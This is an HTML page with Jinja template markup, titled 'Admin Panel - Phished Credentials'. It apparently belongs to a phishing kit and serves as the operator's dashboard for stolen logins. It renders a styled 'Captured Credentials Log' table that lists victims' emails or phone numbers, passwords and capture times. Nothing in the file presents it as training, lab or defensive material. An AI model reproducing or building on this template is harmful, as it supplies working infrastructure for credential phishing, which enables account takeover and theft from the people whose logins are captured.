<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Phished Credentials</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            padding: 20px;
        }

        h1 {
            text-align: center;
            color: #333;
            font-weight: 600;
        }

        .container {
            max-width: 1000px;
            margin: auto;
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0,0,0,0.05);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 15px;
        }

        th, td {
            padding: 12px 15px;
            border: 1px solid #ddd;
            text-align: left;
        }

        th {
            background-color: #2f3542;
            color: #ffffff;
        }

        tr:nth-child(even) {
            background-color: #f1f1f1;
        }

        @media (max-width: 768px) {
            table, thead, tbody, th, td, tr {
                display: block;
            }

            th {
                position: absolute;
                top: -9999px;
                left: -9999px;
            }

            tr {
                margin-bottom: 20px;
                border: 1px solid #ccc;
                padding: 10px;
                background: #fff;
            }

            td {
                border: none;
                position: relative;
                padding-left: 50%;
            }

            td:before {
                position: absolute;
                top: 10px;
                left: 10px;
                width: 45%;
                padding-right: 10px;
                font-weight: bold;
                white-space: nowrap;
                content: attr(data-label);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Captured Credentials Log</h1>
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Email / Phone</th>
                    <th>Password</th>
                    <th>Time</th>
                </tr>
            </thead>
            <tbody>
                {% for entry in data %}
                <tr>
                    <td data-label="ID">{{ entry[0] }}</td>
                    <td data-label="Email / Phone">{{ entry[1] }}</td>
                    <td data-label="Password">{{ entry[2] }}</td>
                    <td data-label="Time">{{ entry[3] }}</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
</body>
</html>
